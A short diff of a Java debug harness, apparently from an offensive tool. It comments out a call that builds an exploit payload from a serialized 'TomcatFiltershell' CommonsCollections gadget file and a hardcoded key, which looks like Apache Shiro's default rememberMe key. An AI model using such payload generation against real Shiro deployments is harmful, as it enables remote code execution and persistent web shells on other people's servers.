@@ -9,6 +9,6 @@ import com.sorry.utils.cipher.rememberMeUtil;
 public class Debug {
 
     public static void main(String[] args) throws Exception {
-        System.out.println(rememberMeUtil.GeneratePayload("/Users/0x22cb7139/Desktop/Serialize/TomcatFiltershell-cc11.ser","kPH+bIxk5D2deZiIxcaaaA=="));
+        //System.out.println(rememberMeUtil.GeneratePayload("/Users/0x22cb7139/Desktop/Serialize/TomcatFiltershell-cc11.ser","kPH+bIxk5D2deZiIxcaaaA=="));
     }
 }
